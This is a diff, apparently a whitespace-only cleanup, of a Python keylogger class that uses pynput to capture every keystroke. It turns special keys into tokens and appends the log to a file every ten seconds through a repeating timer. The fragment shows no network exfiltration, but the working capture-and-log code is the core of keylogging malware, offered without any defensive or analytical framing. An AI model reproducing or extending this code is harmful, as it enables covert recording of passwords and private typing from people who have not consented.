@@ -3,6 +3,7 @@ import pynput.keyboard
 import threading
 import os
 
+
 class KeyLogger:
     def __init__(self):
         self.log = ""
@@ -20,9 +21,9 @@ class KeyLogger:
             elif key == key.enter:
                 self.log += "\n"
             elif key == key.backspace:
-                self.log += "[BACKSPACE]" 
+                self.log += "[BACKSPACE]"
             elif key == key.tab:
-                self.log += "[TAB]"  
+                self.log += "[TAB]"
             elif key == key.esc:
                 self.log += "[ESC]"
             elif key == key.caps_lock:
@@ -37,11 +38,11 @@ class KeyLogger:
             self.log += f" [Error: {e}] "
 
     def save_to_file(self):
-        if self.log.strip(): 
+        if self.log.strip():
             try:
                 with open(self.path, "a", encoding="utf-8") as file:
-                    file.write(self.log)  
-                self.log = ""  
+                    file.write(self.log)
+                self.log = ""
             except Exception:
                 pass
 
@@ -50,9 +51,8 @@ class KeyLogger:
         self.timer = threading.Timer(10, self.report)
         self.timer.start()
 
-
     def start(self):
-        if not self.running:  
+        if not self.running:
             self.running = True
             self.listener = pynput.keyboard.Listener(on_press=self.process_keys)
             with self.listener:
